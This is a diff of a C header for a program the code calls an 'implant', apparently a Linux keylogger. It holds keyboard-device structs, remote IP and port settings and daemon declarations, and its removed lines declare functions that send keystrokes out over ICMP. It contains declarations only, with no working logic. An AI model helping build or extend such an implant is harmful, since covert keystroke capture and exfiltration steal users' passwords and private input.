@@ -8,7 +8,6 @@
 #include <unistd.h>
 
 #define QUEUE_BUFFER_SIZE 1024
-
 #define STRING_BUFFER_SIZE 256
 
 /*
@@ -19,10 +18,10 @@ typedef struct keyboard_s keyboard_t;
 struct keyboard_s {
     int fd;
 
-    ssize_t nb_chars;
-    char buffer[QUEUE_BUFFER_SIZE];
+    uint64_t nb_chars;
+    uint8_t buffer[QUEUE_BUFFER_SIZE];
 
-    char name[STRING_BUFFER_SIZE];
+    int8_t name[STRING_BUFFER_SIZE];
     TAILQ_ENTRY(keyboard_s)
     devices;
 };
@@ -35,9 +34,9 @@ struct keyboard_s {
 typedef struct implant_s {
 
     /* remote connection settings */
-    unsigned short port;
-    char ip[STRING_BUFFER_SIZE];
-    int disable_net;
+    uint16_t port;
+    int8_t ip[STRING_BUFFER_SIZE];
+    uint8_t disable_net;
 
     /* keyboard settings (multiple if using dock or something) */
     TAILQ_HEAD(listhead, keyboard_s)
@@ -45,6 +44,9 @@ typedef struct implant_s {
 
     uint8_t using_caps_lock;
 } implant_t;
+
+/* will be overriden by make rules if debug mode not enabled */
+#define CLIENT_ID ("DEBUG")
 
 #define SUCCESSFUL 1
 #define ERROR 0
@@ -55,7 +57,7 @@ typedef struct implant_s {
 #ifndef DEBUG_LOG
 #define DEBUG_LOG(s, ...)                              \
     do {                                               \
-        char data[256] = {0};                          \
+        char data[512] = {0};                          \
         if (0 > snprintf(data, 255, s, ##__VA_ARGS__)) \
             _exit(1);                                  \
         syslog(LOG_NOTICE, data);                      \
@@ -65,30 +67,20 @@ typedef struct implant_s {
 #define KEY_PRESSED 1
 #define KEY_RELEASED 0
 
-// net.c
-int retrieve_ip_address(char *ip[32]);
-int send_key_icmp(implant_t *, struct input_event);
-
 // opt.c
-int parse_user_input(int, char **, implant_t *);
+int run_lexer(int, char **, implant_t *);
 
-// logger.c
-void keylog(implant_t *);
-
-// keyboard.c
-void fetch_available_keyboards(implant_t *);
-
-// daemon.c
+// deamon.c
 void daemon_setup(void);
 
+// kbd.c
+uint8_t fetch_available_keyboards(implant_t *instance);
+
 // utils.c
-int read_file(char const *, char **);
-size_t
-get_array_size(uint8_t **);
-char *
-remove_repeating_whitespaces(char *);
-void free_tab(uint8_t **);
-char **
-tabgen(const char *, char);
+int8_t file_get_contents(int8_t const *, int8_t **);
+int8_t *remove_repeating_whitespaces(int8_t *);
+uint32_t array_get_size(int8_t **);
+void array_free(int8_t **);
+int8_t **array_from_string(const int8_t *, int8_t);
 
 #endif /* IMPLANT_H */
